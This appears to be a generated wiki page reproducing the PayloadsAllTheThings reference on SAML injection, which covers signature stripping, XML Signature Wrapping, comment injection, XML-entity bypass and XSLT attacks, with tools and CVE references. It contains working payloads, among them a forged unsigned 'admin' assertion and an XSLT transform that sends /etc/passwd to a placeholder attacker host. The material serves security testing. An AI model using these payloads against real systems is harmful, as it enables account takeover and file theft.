---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# SAML Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-saml-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SAML Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [SAML Injection](../../topics/saml-injection/saml-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-saml-injection-readme |
| name | SAML Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SAML%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# SAML Injection\n\n> SAML (Security Assertion Markup Language) is an open standard for exchanging authentication\
  \ and authorization data between parties, in particular, between an identity provider and a service provider. While SAML\
  \ is widely used to facilitate single sign-on (SSO) and other federated authentication scenarios, improper implementation\
  \ or misconfiguration can expose systems to various vulnerabilities.\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n\
  \    * [Invalid Signature](#invalid-signature)\n    * [Signature Stripping](#signature-stripping)\n    * [XML Signature\
  \ Wrapping Attacks](#xml-signature-wrapping-attacks)\n    * [XML Comment Handling](#xml-comment-handling)\n    * [XML External\
  \ Entity](#xml-external-entity)\n    * [Extensible Stylesheet Language Transformation](#extensible-stylesheet-language-transformation)\n\
  * [References](#references)\n\n## Tools\n\n* [CompassSecurity/SAMLRaider](https://github.com/SAMLRaider/SAMLRaider) - SAML2\
  \ Burp Extension.\n* [d0ge/XSW](https://github.com/d0ge/XSW) - XML Signature Wrapping Burp Suite Extensions.\n* [ZAP Addon/SAML\
  \ Support](https://www.zaproxy.org/docs/desktop/addons/saml-support/) - Allows to detect, show, edit, and fuzz SAML requests.\n\
  \n## Methodology\n\nA SAML Response should contain the `<samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"\
  `.\n\n### Invalid Signature\n\nSignatures which are not signed by a real CA are prone to cloning. Ensure the signature is\
  \ signed by a real CA. If the certificate is self-signed, you may be able to clone the certificate or create your own self-signed\
  \ certificate to replace it.\n\n### Signature Stripping\n\n> [...]accepting unsigned SAML assertions is accepting a username\
  \ without checking the password - @ilektrojohn\n\nThe goal is to forge a well formed SAML Assertion without signing it.\
  \ For some default configurations if the signature section is omitted from a SAML response, then no signature verification\
  \ is performed.\n\nExample of SAML assertion where `NameID=admin` without signature.\n\n```xml\n<?xml version=\"1.0\" encoding=\"\
  UTF-8\"?>\n<saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\" Destination=\"http://localhost:7001/saml2/sp/acs/post\"\
  \ ID=\"id39453084082248801717742013\" IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\">\n    <saml2:Issuer xmlns:saml2=\"\
  urn:oasis:names:tc:SAML:2.0:assertion\" Format=\"urn:oasis:names:tc:SAML:2.0:nameidformat:entity\">REDACTED</saml2:Issuer>\n\
  \    <saml2p:Status xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\">\n        <saml2p:StatusCode Value=\"urn:oasis:names:tc:SAML:2.0:status:Success\"\
  \ />\n    </saml2p:Status>\n    <saml2:Assertion xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"id3945308408248426654986295\"\
  \ IssueInstant=\"2018-04-22T10:28:53.593Z\" Version=\"2.0\">\n        <saml2:Issuer Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:entity\"\
  \ xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">REDACTED</saml2:Issuer>\n        <saml2:Subject xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\"\
  >\n            <saml2:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameidformat:unspecified\">admin</saml2:NameID>\n    \
  \        <saml2:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\">\n                <saml2:SubjectConfirmationData\
  \ NotOnOrAfter=\"2018-04-22T10:33:53.593Z\" Recipient=\"http://localhost:7001/saml2/sp/acs/post\" />\n            </saml2:SubjectConfirmation>\n\
  \        </saml2:Subject>\n        <saml2:Conditions NotBefore=\"2018-04-22T10:23:53.593Z\" NotOnOrAfter=\"2018-0422T10:33:53.593Z\"\
  \ xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">\n            <saml2:AudienceRestriction>\n                <saml2:Audience>WLS_SP</saml2:Audience>\n\
  \            </saml2:AudienceRestriction>\n        </saml2:Conditions>\n        <saml2:AuthnStatement AuthnInstant=\"2018-04-22T10:28:49.876Z\"\
  \ SessionIndex=\"id1524392933593.694282512\" xmlns:saml2=\"urn:oasis:names:tc:SAML:2.0:assertion\">\n            <saml2:AuthnContext>\n\
  \                <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>\n\
  \            </saml2:AuthnContext>\n        </saml2:AuthnStatement>\n    </saml2:Assertion>\n</saml2p:Response>\n```\n\n\
  ### XML Signature Wrapping Attacks\n\nXML Signature Wrapping (XSW) attack, some implementations check for a valid signature\
  \ and match it to a valid assertion, but do not check for multiple assertions, multiple signatures, or behave differently\
  \ depending on the order of assertions.\n\n* **XSW1**: Applies to SAML Response messages. Add a cloned unsigned copy of\
  \ the Response after the existing signature.\n* **XSW2**: Applies to SAML Response messages. Add a cloned unsigned copy\
  \ of the Response before the existing signature.\n* **XSW3**: Applies to SAML Assertion messages. Add a cloned unsigned\
  \ copy of the Assertion before the existing Assertion.\n* **XSW4**: Applies to SAML Assertion messages. Add a cloned unsigned\
  \ copy of the Assertion within the existing Assertion.\n* **XSW5**: Applies to SAML Assertion messages. Change a value in\
  \ the signed copy of the Assertion and adds a copy of the original Assertion with the signature removed at the end of the\
  \ SAML message.\n* **XSW6**: Applies to SAML Assertion messages. Change a value in the signed copy of the Assertion and\
  \ adds a copy of the original Assertion with the signature removed after the original signature.\n* **XSW7**: Applies to\
  \ SAML Assertion messages. Add an “Extensions” block with a cloned unsigned assertion.\n* **XSW8**: Applies to SAML Assertion\
  \ messages. Add an “Object” block containing a copy of the original assertion with the signature removed.\n\nIn the following\
  \ example, these terms are used.\n\n* **FA**: Forged Assertion\n* **LA**: Legitimate Assertion\n* **LAS**: Signature of\
  \ the Legitimate Assertion\n\n```xml\n<SAMLResponse>\n  <FA ID=\"evil\">\n      <Subject>Attacker</Subject>\n  </FA>\n \
  \ <LA ID=\"legitimate\">\n      <Subject>Legitimate User</Subject>\n      <LAS>\n         <Reference Reference URI=\"legitimate\"\
  >\n         </Reference>\n      </LAS>\n  </LA>\n</SAMLResponse>\n```\n\nIn the Github Enterprise vulnerability, this request\
  \ would verify and create a sessions for `Attacker` instead of `Legitimate User`, even if `FA` is not signed.\n\n### XML\
  \ Comment Handling\n\nA threat actor who already has authenticated access into a SSO system can authenticate as another\
  \ user without that individual’s SSO password. This [vulnerability](https://www.bleepstatic.com/images/news/u/986406/attacks/Vulnerabilities/SAML-flaw.png)\
  \ has multiple CVE in the following libraries and products.\n\n* OneLogin - python-saml - CVE-2017-11427\n* OneLogin - ruby-saml\
  \ - CVE-2017-11428\n* Clever - saml2-js - CVE-2017-11429\n* OmniAuth-SAML - CVE-2017-11430\n* Shibboleth - CVE-2018-0489\n\
  * Duo Network Gateway - CVE-2018-7340\n\nResearchers have noticed that if an attacker inserts a comment inside the username\
  \ field in such a way that it breaks the username, the attacker might gain access to a legitimate user's account.\n\n```xml\n\
  <SAMLResponse>\n    <Issuer>https://idp.com/</Issuer>\n    <Assertion ID=\"_id1234\">\n        <Subject>\n            <NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>\n\
  ```\n\nWhere `user@user.com` is the first part of the username, and `.evil.com` is the second.\n\n### XML External Entity\n\
  \nAn alternative exploitation would use `XML entities` to bypass the signature verification, since the content will not\
  \ change, except during XML parsing.\n\nIn the following example:\n\n* `&s;` will resolve to the string `\"s\"`\n* `&f1;`\
  \ will resolve to the string `\"f1\"`\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE Response [\n  <!ENTITY\
  \ s \"s\">\n  <!ENTITY f1 \"f1\">\n]>\n<saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\"\n  Destination=\"\
  https://idptestbed/Shibboleth.sso/SAML2/POST\"\n  ID=\"_04cfe67e596b7449d05755049ba9ec28\"\n  InResponseTo=\"_dbbb85ce7ff81905a3a7b4484afb3a4b\"\
  \n  IssueInstant=\"2017-12-08T15:15:56.062Z\" Version=\"2.0\">\n[...]\n  <saml2:Attribute FriendlyName=\"uid\"\n    Name=\"\
  urn:oid:0.9.2342.19200300.100.1.1\"\n    NameFormat=\"urn:oasis:names:tc:SAML:2.0:attrname-format:uri\">\n    <saml2:AttributeValue>\n\
  \      &s;taf&f1;\n    </saml2:AttributeValue>\n  </saml2:Attribute>\n[...]\n</saml2p:Response>\n```\n\nThe SAML response\
  \ is accepted by the service provider. Due to the vulnerability, the service provider application reports \"taf\" as the\
  \ value of the \"uid\" attribute.\n\n### Extensible Stylesheet Language Transformation\n\nAn XSLT can be carried out by\
  \ using the `transform` element.\n\n![http://sso-attacks.org/images/4/49/XSLT1.jpg](http://sso-attacks.org/images/4/49/XSLT1.jpg)\n\
  Picture from [http://sso-attacks.org/XSLT_Attack](http://sso-attacks.org/XSLT_Attack)\n\n```xml\n<ds:Signature xmlns:ds=\"\
  http://www.w3.org/2000/09/xmldsig#\">\n  ...\n    <ds:Transforms>\n      <ds:Transform>\n        <xsl:stylesheet xmlns:xsl=\"\
  http://www.w3.org/1999/XSL/Transform\">\n          <xsl:template match=\"doc\">\n            <xsl:variable name=\"file\"\
  \ select=\"unparsed-text('/etc/passwd')\"/>\n            <xsl:variable name=\"escaped\" select=\"encode-for-uri($file)\"\
  />\n            <xsl:variable name=\"attackerUrl\" select=\"'http://[ATTACKER.DOMAIN.TLD]/'\"/>\n            <xsl:variable\
  \ name=\"exploitUrl\"select=\"concat($attackerUrl,$escaped)\"/>\n            <xsl:value-of select=\"unparsed-text($exploitUrl)\"\
  />\n          </xsl:template>\n        </xsl:stylesheet>\n      </ds:Transform>\n    </ds:Transforms>\n  ...\n</ds:Signature>\n\
  ```\n\n## References\n\n* [Attacking SSO: Common SAML Vulnerabilities and Ways to Find Them - Jem Jensen - March 7, 2017](https://web.archive.org/web/20171113204302/https://blog.netspi.com/attacking-sso-common-saml-vulnerabilities-ways-find/)\n\
  * [How to Hunt Bugs in SAML; a Methodology - Part I - Ben Risher (@epi052) - March 7, 2019](https://web.archive.org/web/20260119151024/https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)\n\
  * [How to Hunt Bugs in SAML; a Methodology - Part II - Ben Risher (@epi052) - March 13, 2019](https://web.archive.org/web/20190511102027/https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\n\
  * [How to Hunt Bugs in SAML; a Methodology - Part III - Ben Risher (@epi052) - March 16, 2019](https://web.archive.org/web/20250619124546/https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)\n\
  * [On Breaking SAML: Be Whoever You Want to Be - Juraj Somorovsky, Andreas Mayer, Jorg Schwenk, Marco Kampmann, and Meiko\
  \ Jensen - August 23, 2012](https://web.archive.org/web/20130520064525/https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91-8-23-12.pdf)\n\
  * [Oracle Weblogic - Multiple SAML Vulnerabilities (CVE-2018-2998/CVE-2018-2933) - Denis Andzakovic - July 18, 2018](https://web.archive.org/web/20181221074856/https://pulsesecurity.co.nz/advisories/WebLogic-SAML-Vulnerabilities)\n\
  * [SAML Burp Extension - Roland Bischofberger - July 24, 2015](https://web.archive.org/web/20260213191343/https://blog.compass-security.com/2015/07/saml-burp-extension/)\n\
  * [SAML Security Cheat Sheet - OWASP - February 2, 2019](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md)\n\
  * [The road to your codebase is paved with forged assertions - Ioannis Kakavas (@ilektrojohn) - March 13, 2017](https://web.archive.org/web/20170314055835/http://www.economyofmechanism.com/github-saml)\n\
  * [Truncation of SAML Attributes in Shibboleth 2 - redteam-pentesting.de - January 15, 2018](https://web.archive.org/web/20190607070528/https://www.redteam-pentesting.de/de/advisories/rt-sa-2017-013/-truncation-of-saml-attributes-in-shibboleth-2)\n\
  * [Vulnerability Note VU#475445 - Garret Wassermann - February 27, 2018](https://web.archive.org/web/20180227170113/http://kb.cert.org/vuls/id/475445)"
_relative_path: SAML Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SAML Injection/README.md
````
